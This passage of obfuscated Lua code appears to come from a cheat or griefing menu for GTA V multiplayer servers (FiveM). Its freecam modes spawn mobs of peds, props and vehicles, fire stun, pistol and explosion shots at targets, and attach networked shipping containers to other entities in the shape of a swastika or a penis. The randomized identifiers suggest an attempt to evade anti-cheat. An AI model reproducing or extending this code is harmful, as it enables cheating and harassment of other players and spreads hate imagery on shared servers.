                        elseif nlFXKkFxuKQAk.natives.IsDisabledControlPressed(1, 15) then							
                            jrnyLearIyzKiSIen.config.freecammode = (jrnyLearIyzKiSIen.config.freecammode - 1) % 11
                        elseif nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(1,RfPsUKHSFWJuBEJuz.Keys['MOUSE2']) then						
                            if jrnyLearIyzKiSIen.config.freecammode == 2 then
                                jrnyLearIyzKiSIen.config.freecamoptiona = (jrnyLearIyzKiSIen.config.freecamoptiona + 1) % 5
                            elseif jrnyLearIyzKiSIen.config.freecammode == 3 then
                                jrnyLearIyzKiSIen.config.freecamoptionb = (jrnyLearIyzKiSIen.config.freecamoptionb + 1) % 3
                            elseif jrnyLearIyzKiSIen.config.freecammode == 5 then
                                jrnyLearIyzKiSIen.config.freecamoptionc = (jrnyLearIyzKiSIen.config.freecamoptionc + 1) % 4
                            end
                        end
                        if jrnyLearIyzKiSIen.config.freecammode == 0 then
                            jrnyLearIyzKiSIen.func.DrawSomeText("LOOK AROUND", 4, false, (sx / 2) - 30, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                            jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 100, sy - 45,175,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            jrnyLearIyzKiSIen.freec.FCInstruc(1)
                        elseif jrnyLearIyzKiSIen.config.freecammode == 1 then
                            jrnyLearIyzKiSIen.func.DrawSomeText("TELEPORT", 4, false, (sx / 2) - 30, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                            jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 100, sy - 45,145,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            jrnyLearIyzKiSIen.freec.FCInstruc(2)					
                        elseif jrnyLearIyzKiSIen.config.freecammode == 2 then
                            jrnyLearIyzKiSIen.func.DrawSomeText("SPAMER  |", 4, false, (sx / 2) - 30, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                            jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 100, sy - 45,120,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            if jrnyLearIyzKiSIen.config.freecamoptiona == 0 then
                                jrnyLearIyzKiSIen.func.DrawSomeText("NONE", 4, false, (sx / 2) + 50, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                                jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 50, sy - 45,145,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            elseif jrnyLearIyzKiSIen.config.freecamoptiona == 1 then
                                jrnyLearIyzKiSIen.func.DrawSomeText("PEDS", 4, false, (sx / 2) + 50, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                                jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 50, sy - 45,145,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            elseif jrnyLearIyzKiSIen.config.freecamoptiona == 2 then
                                jrnyLearIyzKiSIen.func.DrawSomeText("PROPS", 4, false, (sx / 2) + 50, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                                jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 40, sy - 45,145,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            elseif jrnyLearIyzKiSIen.config.freecamoptiona == 3 then
                                jrnyLearIyzKiSIen.func.DrawSomeText("VEHICLES", 4, false, (sx / 2) + 50, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                                jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 25, sy - 45,145,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            elseif jrnyLearIyzKiSIen.config.freecamoptiona == 4 then
                                jrnyLearIyzKiSIen.func.DrawSomeText("VEHICLE", 4, false, (sx / 2) + 50, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                                jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 25, sy - 45,145,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            end
                            jrnyLearIyzKiSIen.freec.FCInstruc(3)						
                        elseif jrnyLearIyzKiSIen.config.freecammode == 3 then
                            jrnyLearIyzKiSIen.func.DrawSomeText("ATTACH  |", 4, false, (sx / 2) - 30, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                            jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 100, sy - 45,145,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            if jrnyLearIyzKiSIen.config.freecamoptionb == 0 then
                                jrnyLearIyzKiSIen.func.DrawSomeText("NONE", 4, false, (sx / 2) + 45, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                                jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 50, sy - 45,145,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            elseif jrnyLearIyzKiSIen.config.freecamoptionb == 1 then
                                jrnyLearIyzKiSIen.func.DrawSomeText("SWASTIKA", 4, false, (sx / 2) + 45, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                                jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 20, sy - 45,145,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            elseif jrnyLearIyzKiSIen.config.freecamoptionb == 2 then
                                jrnyLearIyzKiSIen.func.DrawSomeText("DICK", 4, false, (sx / 2) + 45, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                                jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 50, sy - 45,145,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            end
                            jrnyLearIyzKiSIen.freec.FCInstruc(4)					
                        elseif jrnyLearIyzKiSIen.config.freecammode == 4 then
                            jrnyLearIyzKiSIen.func.DrawSomeText("DELETE", 4, false, (sx / 2) - 30, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                            jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 100, sy - 45,127,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            jrnyLearIyzKiSIen.freec.FCInstruc(5)						
                        elseif jrnyLearIyzKiSIen.config.freecammode == 5 then
                            jrnyLearIyzKiSIen.func.DrawSomeText("SHOOT  |", 4, false, (sx / 2) - 30, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                            jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 100, sy - 45,135,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            if jrnyLearIyzKiSIen.config.freecamoptionc == 0 then
                                jrnyLearIyzKiSIen.func.DrawSomeText("NONE", 4, false, (sx / 2) + 45, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                                jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 50, sy - 45,145,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            elseif jrnyLearIyzKiSIen.config.freecamoptionc == 1 then
                                jrnyLearIyzKiSIen.func.DrawSomeText("TAZE", 4, false, (sx / 2) + 45, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                                jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 50, sy - 45,145,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            elseif jrnyLearIyzKiSIen.config.freecamoptionc == 2 then
                                jrnyLearIyzKiSIen.func.DrawSomeText("PISTOL", 4, false, (sx / 2) + 45, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                                jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 50, sy - 45,155,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            elseif jrnyLearIyzKiSIen.config.freecamoptionc == 3 then
                                jrnyLearIyzKiSIen.func.DrawSomeText("RPG", 4, false, (sx / 2) + 45, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                                jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 50, sy - 45,145,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            end
                            jrnyLearIyzKiSIen.freec.FCInstruc(6)						
                        elseif jrnyLearIyzKiSIen.config.freecammode == 6 then
                            jrnyLearIyzKiSIen.func.DrawSomeText("EFFECTS", 4, false, (sx / 2) - 30, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                            jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 100, sy - 45,133,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            jrnyLearIyzKiSIen.freec.FCInstruc(7)
                        elseif jrnyLearIyzKiSIen.config.freecammode == 7 then
                            jrnyLearIyzKiSIen.func.DrawSomeText("SPOONER  |", 4, false, (sx / 2) - 30, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                            jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 100, sy - 45,143,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            jrnyLearIyzKiSIen.freec.FCInstruc(8)						
                        elseif jrnyLearIyzKiSIen.config.freecammode == 8 then
                            jrnyLearIyzKiSIen.func.DrawSomeText("MOVER", 4, false, (sx / 2) - 30, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                            jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 100, sy - 45,130,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            jrnyLearIyzKiSIen.freec.FCInstruc(9)
                        elseif jrnyLearIyzKiSIen.config.freecammode == 9 then
                            jrnyLearIyzKiSIen.func.DrawSomeText("CLONER", 4, false, (sx / 2) - 30, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                            jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 100, sy - 45,130,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            jrnyLearIyzKiSIen.freec.FCInstruc(10)
                        elseif jrnyLearIyzKiSIen.config.freecammode == 10 then
                            jrnyLearIyzKiSIen.func.DrawSomeText("RC CAR", 4, false, (sx / 2) - 30, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                            jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 100, sy - 45,130,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                            jrnyLearIyzKiSIen.freec.FCInstruc(11)
                        end


                            --FREECAM SHOOT					
                            if hit and jrnyLearIyzKiSIen.config.freecamoptionc == 1 and jrnyLearIyzKiSIen.config.freecammode == 5 and AimClickOnThing2 then
                                nlFXKkFxuKQAk.natives.ShootSingleBulletBetweenCoords(coords.x + 3,coords.y + 3,coords.z + 3, coords.x,coords.y,coords.z, 0.0, true, `WEAPON_STUNGUN`, nlFXKkFxuKQAk.natives.PlayerPedId(), true, false, 5.0)						
                            elseif hit and jrnyLearIyzKiSIen.config.freecamoptionc == 2 and jrnyLearIyzKiSIen.config.freecammode == 5 and AimClickOnThing2 then
                                nlFXKkFxuKQAk.natives.ShootSingleBulletBetweenCoords(coords.x + 3,coords.y + 3,coords.z + 3, coords.x,coords.y,coords.z, 500.0, true, `WEAPON_PISTOL`, nlFXKkFxuKQAk.natives.PlayerPedId(), true, false, 5.0)						
                            elseif hit and jrnyLearIyzKiSIen.config.freecamoptionc == 3 and jrnyLearIyzKiSIen.config.freecammode == 5 and AimClickOnThing2 then
                                nlFXKkFxuKQAk.natives.AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
                            end

                            --FREE CAM EFFECTS									
                            if hit and jrnyLearIyzKiSIen.config.freecammode == 6 and AimClickOnThing2 then
                                nlFXKkFxuKQAk.natives.StartNetworkedParticleFxNonLoopedAtCoord("veh_light_amber",coords.x,coords.y,coords.z,0,0,0,100.0,0,0,0)							
                                nlFXKkFxuKQAk.natives.UseParticleFxAsset(gox_dict)							
                                nlFXKkFxuKQAk.natives.StartNetworkedParticleFxNonLoopedAtCoord("veh_backfire",coords.x,coords.y,coords.z,0,0,0,100.0,0,0,0)							
                                nlFXKkFxuKQAk.natives.UseParticleFxAsset(gox_dict)							
                                nlFXKkFxuKQAk.natives.StartNetworkedParticleFxNonLoopedAtCoord("td_blood_shotgun",coords.x,coords.y,coords.z,0,0,0,100.0,0,0,0)							
                                nlFXKkFxuKQAk.natives.UseParticleFxAsset(gox_dict)							
                                nlFXKkFxuKQAk.natives.StartNetworkedParticleFxNonLoopedAtCoord("veh_respray_smoke",coords.x,coords.y,coords.z,0,0,0,100.0,0,0,0)							
                                nlFXKkFxuKQAk.natives.UseParticleFxAsset(gox_dict)							
                                nlFXKkFxuKQAk.natives.StartNetworkedParticleFxNonLoopedAtCoord("ent_sht_petrol_fire",coords.x,coords.y,coords.z,0,0,0,100.0,0,0,0)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Effects Have Been ~g~Played')						
                            end
                            --FREECAM ATTACHER									
                            if hit and jrnyLearIyzKiSIen.config.freecamoptionb == 1 and jrnyLearIyzKiSIen.config.freecammode == 3 and AimClickOnThing then		
                                local object = RfPsUKHSFWJuBEJuz.rE.LumHash('prop_container_03a')			
                                local goxprop = nlFXKkFxuKQAk.natives.CreateObject(object, 0,0,0, true, true, true)					
                                local goxprops = nlFXKkFxuKQAk.natives.CreateObject(object, 0,0,0, true, true, true)					
                                local goxpropss = nlFXKkFxuKQAk.natives.CreateObject(object, 0,0,0, true, true, true)					
                                local goxpropsss = nlFXKkFxuKQAk.natives.CreateObject(object, 0,0,0, true, true, true)					
                                local goxpropssss = nlFXKkFxuKQAk.natives.CreateObject(object, 0,0,0, true, true, true)					
                                local goxpropsssss = nlFXKkFxuKQAk.natives.CreateObject(object, 0,0,0, true, true, true)					
                                local goxpropssssss = nlFXKkFxuKQAk.natives.CreateObject(object, 0,0,0, true, true, true)					
                                local goxpropsssssss = nlFXKkFxuKQAk.natives.CreateObject(object, 0,0,0, true, true, true)					
                                local goxpropssssssss = nlFXKkFxuKQAk.natives.CreateObject(object, 0,0,0, true, true, true)					
                                local goxpropsssssssss = nlFXKkFxuKQAk.natives.CreateObject(object, 0,0,0, true, true, true)				
                                local goxpropssssssssss = nlFXKkFxuKQAk.natives.CreateObject(object, 0,0,0, true, true, true)				
                                local goxpropsssssssssss = nlFXKkFxuKQAk.natives.CreateObject(object, 0,0,0, true, true, true)			
                                local goxpropssssssssssss = nlFXKkFxuKQAk.natives.CreateObject(object, 0,0,0, true, true, true)	
                                local goxpropsssssssssssss = nlFXKkFxuKQAk.natives.CreateObject(object, 0,0,0, true, true, true)					
                                local goxpropssssssssssssss = nlFXKkFxuKQAk.natives.CreateObject(object, 0,0,0, true, true, true)					
                                local goxpropsssssssssssssss = nlFXKkFxuKQAk.natives.CreateObject(object, 0,0,0, true, true, true)					
                                nlFXKkFxuKQAk.natives.AttachEntityToEntity(goxprop, entity, 0, 0.0, 0.0, 10.0, 0.0, 0.0, 0, true, true, false, true, 1, true)					
                                nlFXKkFxuKQAk.natives.AttachEntityToEntity(goxprops,entity, 0, 0.0, 5.0, 10.0, 0.0, 0.0, 0, true, true, false, true, 1, true)					
                                nlFXKkFxuKQAk.natives.AttachEntityToEntity(goxpropss, entity, 0, 0, -0.5, 15.0, 90.0, 0.0, 0, true, true, false, true, 1, true)					
                                nlFXKkFxuKQAk.natives.AttachEntityToEntity(goxpropsss, entity, 0, 0, -0.5, 20.0, 90.0, 0.0, 0, true, true, false, true, 1, true)					
                                nlFXKkFxuKQAk.natives.AttachEntityToEntity(goxpropssss, entity, 0, 0.0, -4.0, 21.7, 0.0, 0.0, 0, true, true, false, true, 1, true)					
                                nlFXKkFxuKQAk.natives.AttachEntityToEntity(goxpropsssss, entity, 0, 0.0, -9.0, 21.7, 0.0, 0.0, 0, true, true, false, true, 1, true)					
                                nlFXKkFxuKQAk.natives.AttachEntityToEntity(goxpropssssss, entity, 0, 0, -9.5, 13.5, 90.0, 0.0, 0, true, true, false, true, 1, true)					
                                nlFXKkFxuKQAk.natives.AttachEntityToEntity(goxpropsssssss, entity, 0, 0, -9.5, 19.5, 90.0, 0.0, 0, true, true, false, true, 1, true)					
                                nlFXKkFxuKQAk.natives.AttachEntityToEntity(goxpropssssssss, entity, 0, 0, -0.5, 27.0, 90.0, 0.0, 0, true, true, false, true, 1, true)
                                nlFXKkFxuKQAk.natives.AttachEntityToEntity(goxpropsssssssss, entity, 0, 0, -0.5, 32.0, 90.0, 0.0, 0, true, true, false, true, 1, true)					
                                nlFXKkFxuKQAk.natives.AttachEntityToEntity(goxpropssssssssss, entity, 0, 0.0, -5.0, 32.6, 0.0, 0.0, 0, true, true, false, true, 1, true)					
                                nlFXKkFxuKQAk.natives.AttachEntityToEntity(goxpropsssssssssss, entity, 0, 0.0, -10.0, 32.6, 0.0, 0.0, 0, true, true, false, true, 1, true)					
                                nlFXKkFxuKQAk.natives.AttachEntityToEntity(goxpropssssssssssss, entity, 0, 0.0, 0.0, 21.7, 0.0, 0.0, 0, true, true, false, true, 1, true)					
                                nlFXKkFxuKQAk.natives.AttachEntityToEntity(goxpropsssssssssssss, entity, 0, 0.0, 5.0, 21.7, 0.0, 0.0, 0, true, true, false, true, 1, true)					
                                nlFXKkFxuKQAk.natives.AttachEntityToEntity(goxpropssssssssssssss,entity, 0, 0, 8.5, 27.0, 90.0, 0.0, 0, true, true, false, true, 1, true)					
                                nlFXKkFxuKQAk.natives.AttachEntityToEntity(goxpropsssssssssssssss, entity, 0, 0, 8.5, 32.0, 90.0, 0.0, 0, true, true, false, true, 1, true)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('~g~Attached ~w~Swastica')						
                            elseif  hit and jrnyLearIyzKiSIen.config.freecamoptionb == 2 and jrnyLearIyzKiSIen.config.freecammode == 3 and AimClickOnThing then		
                                local goxint_god = "prop_container_03a"				
                                local goxint_god_hey_bitch = RfPsUKHSFWJuBEJuz.rE.LumHash(goxint_god)					
                                local goxprop = nlFXKkFxuKQAk.natives.CreateObject(goxint_god_hey_bitch, 0, 0, 0, true, true, true) 					
                                local goxprop_ = nlFXKkFxuKQAk.natives.CreateObject(goxint_god_hey_bitch, 0, 0, 0, true, true, true) 					
                                local _goxprop_ = nlFXKkFxuKQAk.natives.CreateObject(goxint_god_hey_bitch, 0, 0, 0, true, true, true) 					
                                local _goxprop__ = nlFXKkFxuKQAk.natives.CreateObject(goxint_god_hey_bitch, 0, 0, 0, true, true, true) 					
                                nlFXKkFxuKQAk.natives.AttachEntityToEntity(goxprop, entity, 0, -2.5, 0, 3.0, 0.0, 0.0,90.0, true, true, false, true, 1, true)					
                                nlFXKkFxuKQAk.natives.AttachEntityToEntity(goxprop_ , entity, 0, 2.5, 0, 3.0, 0.0, 0.0, 90.0, true, true, false, true, 1, true)					
                                nlFXKkFxuKQAk.natives.AttachEntityToEntity(_goxprop_ , entity, 0, 0, 1.4, 8.0, 90.0, 0.0, 0.0, true, true, false, true, 1, true)					
                                nlFXKkFxuKQAk.natives.AttachEntityToEntity(_goxprop__ , entity, 0, 0, 1.4, 12.0, 90.0, 0.0, 0.0, true, true, false, true, 1, true)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('~g~Attached ~w~Dick')						
                            end
                            --FREECAM SPAWNER										   
                            if jrnyLearIyzKiSIen.config.freecamoptiona == 1 and AimClickOnThing2 and jrnyLearIyzKiSIen.config.freecammode == 2 then  							
                                local gox_hashes = {`a_f_m_fatbla_01`,`a_f_m_soucent_01`,`a_f_y_vinewood_04`,`a_m_m_genfat_01`,`a_m_m_salton_04`}

                                for i = 1, #gox_hashes do 
                                    if nlFXKkFxuKQAk.natives.RequestModel(gox_hashes[i]) then							
                                        local ass = nlFXKkFxuKQAk.natives.CreatePed(0,gox_hashes[i],coords.x,coords.y,coords.z,true,true,true) 
                                    end 
                                end
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('~g~Spawned ~w~Peds')					   
                            elseif jrnyLearIyzKiSIen.config.freecamoptiona == 2 and AimClickOnThing2 and jrnyLearIyzKiSIen.config.freecammode == 2 then 							
                                local gox_hashes = {`ex_prop_crate_closed_bc`,`p_dock_crane_sld_s`,`p_dinechair_01_s`,`prop_xmas_tree_int`,`prop_airhockey_01`}							
                                for i = 1, #gox_hashes do 
                                    if nlFXKkFxuKQAk.natives.RequestModel(gox_hashes[i]) then							
                                        local ass = nlFXKkFxuKQAk.natives.CreateObject(gox_hashes[i], coords.x, coords.y, coords.z, true, true, true) 
                                        nlFXKkFxuKQAk.natives.SetEntityVisible(ass, true)
                                        nlFXKkFxuKQAk.natives.FreezeEntityPosition(ass, false)
                                    end
                                end
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('~g~Spawned ~w~Objects')					   
                            elseif jrnyLearIyzKiSIen.config.freecamoptiona == 3 and AimClickOnThing2 and jrnyLearIyzKiSIen.config.freecammode == 2 then 							
                                local gox_hashes = {`trash`,`mule2`,`bulldozer`,`bus`,`tug`}
                            
                                for i = 1, #gox_hashes do 
                                    if nlFXKkFxuKQAk.natives.RequestModel(gox_hashes[i]) then
                                        local ass = nlFXKkFxuKQAk.natives.CreateVehicle(gox_hashes[i], coords.x, coords.y, coords.z, true, true, true) 
                                    end 
                                end
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('~g~Spawned ~w~Vehicles')
                            elseif jrnyLearIyzKiSIen.config.freecamoptiona == 4 and AimClickOnThing and jrnyLearIyzKiSIen.config.freecammode == 2 then						
                                local IONMOD = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput("Vehicle Model", "", 20)							
                                if nlFXKkFxuKQAk.natives.IsModelValid(IONMOD) and nlFXKkFxuKQAk.natives.IsModelAVehicle(IONMOD) then								
                                    nlFXKkFxuKQAk.natives.RequestModel(IONMOD)								
                                    while not nlFXKkFxuKQAk.natives.HasModelLoaded(IONMOD) do									
                                        RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                                    end								
                                    nlFXKkFxuKQAk.natives.CreateVehicle(RfPsUKHSFWJuBEJuz.rE.LumHash(IONMOD), coords.x, coords.y, coords.z, true, true, true)				
                                else
                                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('~r~Model Is Not A Vehicle')
                                end
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('~g~Spawned ~w~Vehicle')					   
                            end
                            if jrnyLearIyzKiSIen.config.freecammode == 7 then

                                if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(1, RfPsUKHSFWJuBEJuz.Keys['MOUSE2']) then
